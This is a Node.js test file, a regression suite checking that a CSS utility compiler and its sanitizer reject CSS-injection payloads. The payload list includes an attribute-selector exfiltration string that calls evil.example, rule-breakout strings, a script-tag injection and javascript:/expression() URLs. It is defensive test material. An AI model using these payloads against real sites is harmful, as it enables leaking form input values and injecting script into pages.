/**
 * CSS-injection regression suite (audit finding C1).
 * Every payload must produce either no CSS for that token, or CSS whose rule
 * bodies contain no `{`/`}` beyond the single rule wrapper — i.e. nothing can
 * break out of its declaration block or selector.
 */
import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { compileSource } from '../../src/index.js';
import { tokenize } from '../../src/core/tokenizer-core.js';
import { defaultConfig, mergeConfig } from '../../src/config/defaults.js';
import { sanitizeAttributeValue } from '../../src/cdn/scan.js';

const config = mergeConfig(defaultConfig, {});

const PAYLOADS = [
  ['visual', 'bg:[red}input[value^=a]{background:url(https://evil.example/?a)]'],
  ['layout', 'justify:x}body{display:none}a{b:c'],
  ['space', 'm:[1px}x{y:z]'],
  ['space', 'p:big}body{display:none'],
  ['visual', 'bg:[red;background-image:url(https://evil)]'],
  ['visual', 'text:[</style><script>alert(1)</script>]'],
  ['visual', 'bg:[expression(alert(1))]'],
  ['visual', 'bg-image:[url(javascript:alert(1))]'],
  ['visual', 'bg-image:[url(data:text/html,x)]'],
  ['visual', 'bg:[red\n}body{display:none]'],
  ['visual', 'bg:[red\\7d body{display:none]'],
  ['visual', 'content:["a"}body{x:y]'],
  ['visual', 'bg:[red)]'],
  ['visual', 'bg:[@import_url(x)]'],
  ['layout', 'z:[1}*{display:none]'],
  ['visual', 'hover:bg:red}a{b:c'],
  ['visual', 'tab:text:x;color:red'],
  ['visual', 'bg:primary/50}x{y:z'],
];

/** Count rule-block braces outside of :root/@layer/@media/@keyframes wrappers. */
function utilitySection(css) {
  const i = css.indexOf('/* SenangStart utilities');
  return i >= 0 ? css.slice(i) : css;
}

describe('security: CSS injection payloads', () => {
  for (const [attr, raw] of PAYLOADS) {
    test(`${attr}="${raw.replace(/\n/g, '\\n')}" cannot escape its rule`, () => {
      const tok = tokenize(raw, attr, config);
      const html = `<div ${attr}='${raw.replace(/'/g, '&#39;')}'></div>`;
      const { css } = compileSource(html, { ...config, preflight: false });
      const out = utilitySection(css || '');
      assert.ok(!/body\s*\{/.test(out), `body rule injected: ${out.slice(0, 300)}`);
      assert.ok(!/\*\s*\{display/.test(out), 'universal rule injected');
      assert.ok(!/input\[value/.test(out.replace(/\[visual~="[^"]*(?:\\.[^"]*)*"\]/g, '')), 'exfil selector injected');
      assert.ok(!/<\/style|<script/i.test(out), 'html injected');
      assert.ok(!/javascript:|expression\(|@import/i.test(out), 'dangerous construct emitted');
      // tokenizer must flag the token
      assert.ok(tok.error, `tokenizer accepted payload: ${JSON.stringify(tok)}`);
    });
  }

  test('JIT sanitizer rejects the same payloads', () => {
    for (const [, raw] of PAYLOADS) {
      const s = sanitizeAttributeValue(raw);
      assert.ok(!/[{};<>]/.test(s), `JIT sanitizer passed ${raw} → ${s}`);
    }
  });

  test('legitimate tricky values still work', () => {
    for (const [attr, raw, needle] of [
      ['space', 'w:[calc(100%-2rem)]', 'calc(100% - 2rem)'],
      ['visual', 'bg:[rgb(1_2_3)]', 'rgb(1 2 3)'],
      ['visual', 'bg:primary/50', 'color-mix'],
      ['layout', 'grid-cols:[repeat(auto-fit,minmax(200px,1fr))]', 'minmax(200px,1fr)'],
      ['space', 'm:-small', 'calc'],
    ]) {
      const { css } = compileSource(`<div ${attr}="${raw}"></div>`, { ...config, preflight: false });
      assert.ok(css.includes(needle), `${raw} lost: expected ${needle}`);
    }
  });

  test('tokens containing quotes produce a valid escaped selector', () => {
    const { css } = compileSource(`<div visual='content:["hi"]'></div>`, { ...config, preflight: false });
    assert.ok(css.includes('[visual~="content:[\\"hi\\"]"]'), css.slice(-400));
  });
});
